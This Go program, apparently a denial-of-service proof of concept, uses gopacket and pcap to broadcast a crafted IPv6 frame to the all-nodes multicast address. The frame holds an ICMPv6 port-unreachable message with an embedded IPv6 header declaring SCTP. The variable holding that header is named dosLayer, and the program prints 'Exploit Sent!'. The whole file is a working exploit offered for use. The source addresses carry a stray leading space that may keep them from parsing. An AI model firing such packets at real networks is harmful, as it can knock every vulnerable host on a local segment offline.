package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"time"
	"os"
)

var (
	device      string = ""
	snapshotLen int32  = 65535
	promiscuous        = false
	err         error
	timeout     = -1 * time.Second
	handle      *pcap.Handle
)

func main() {

	if len(os.Args) <2{
		fmt.Println("specify device")
		return
	}
	device = os.Args[1]


	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x8c, 0x85, 0x90, 0xFF, 0xFF, 0xFF},
		DstMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // sends frames to broadcast address
		EthernetType: layers.EthernetTypeIPv6,
	}


	ipLayer := &layers.IPv6{
		Version: 6,
		SrcIP: net.ParseIP(" fe80::85c9:30e4:f5ef:53bf"),
		DstIP:net.ParseIP("ff02::1"),
		NextHeader: layers.IPProtocolICMPv6,
	}

	icmpLayer:= &layers.ICMPv6{
		TypeCode:layers.CreateICMPv6TypeCode(1,4),
	}

	icmpLayer.SetNetworkLayerForChecksum(ipLayer)

	dosLayer:= &layers.IPv6{
		Version: 6,
		SrcIP: net.ParseIP(" fe80::85c9:30e4:f5ef:53bf"),
		DstIP:net.ParseIP("ff02::1"),
		NextHeader: layers.IPProtocolSCTP,
	}

	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	}

	buffer:= gopacket.NewSerializeBuffer()

	gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, icmpLayer, dosLayer)

	err = handle.WritePacketData(buffer.Bytes())
	if err != nil{
		log.Fatal(err)
	}
	fmt.Println("Exploit Sent!")
}
